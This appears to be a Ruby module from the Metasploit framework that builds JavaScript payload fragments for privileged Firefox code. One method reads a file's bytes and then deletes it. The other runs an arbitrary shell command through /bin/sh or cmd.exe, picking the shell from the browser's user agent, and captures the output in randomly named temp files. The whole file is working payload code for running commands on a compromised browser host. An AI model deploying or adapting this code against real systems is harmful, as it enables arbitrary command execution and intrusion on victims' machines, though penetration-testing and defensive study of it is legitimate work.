# -*- coding: binary -*-
require 'msf/core'

module Msf::Payload::Firefox
  def read_file_source
    %Q|
      var readFile = function(path) {
        try {
          var file = Components.classes["@mozilla.org/file/local;1"]
                   .createInstance(Components.interfaces.nsILocalFile);
          file.initWithPath(path);

          var fileStream = Components.classes["@mozilla.org/network/file-input-stream;1"]
                           .createInstance(Components.interfaces.nsIFileInputStream);
          fileStream.init(file, 1, 0, false);

          var binaryStream = Components.classes["@mozilla.org/binaryinputstream;1"]
                             .createInstance(Components.interfaces.nsIBinaryInputStream);
          binaryStream.setInputStream(fileStream);
          var array = binaryStream.readByteArray(fileStream.available());

          binaryStream.close();
          fileStream.close();
          file.remove(true);

          return array.map(function(aItem) { return String.fromCharCode(aItem); }).join("");
        } catch (e) { return ""; }
      };
    |
  end

  def run_cmd_source
    %Q|
      var ua = Components.classes["@mozilla.org/network/protocol;1?name=http"]
        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
      var _cmd;
      var runCmd = function(cmd) {
        var shPath = "/bin/sh";
        var shFlag = "-c";
        var shEsc = "\\\\$&";

        if (ua.indexOf("Windows")>-1) {
          shPath = "C:\\\\Windows\\\\system32\\\\cmd.exe";
          shFlag = "/c";
          shEsc = "\\^$&";
        }

        var stdoutFile = "#{Rex::Text.rand_text_alphanumeric(8)}";
        var stderrFile = "#{Rex::Text.rand_text_alphanumeric(8)}";

        var stdout = Components.classes["@mozilla.org/file/directory_service;1"]
          .getService(Components.interfaces.nsIProperties)
          .get("TmpD", Components.interfaces.nsIFile);
        stdout.append(stdoutFile);

        var stderr = Components.classes["@mozilla.org/file/directory_service;1"]
          .getService(Components.interfaces.nsIProperties)
          .get("TmpD", Components.interfaces.nsIFile);
        stderr.append(stderrFile);

        var sh = Components.classes["@mozilla.org/file/local;1"]
                   .createInstance(Components.interfaces.nsILocalFile);
        sh.initWithPath(shPath);

        var shell = shPath + " " + shFlag + " " + cmd.replace(/\\W/g, shEsc);
        shell = shPath + " " + shFlag + " " + (shell + " >"+stdout.path+" 2>"+stderr.path).replace(/\\W/g, shEsc);

        var process = Components.classes["@mozilla.org/process/util;1"]
          .createInstance(Components.interfaces.nsIProcess);
        process.init(sh);
        process.run(true, [shFlag, shell], 2);
        return [readFile(stdout.path), readFile(stderr.path)];
      };
    |
  end
end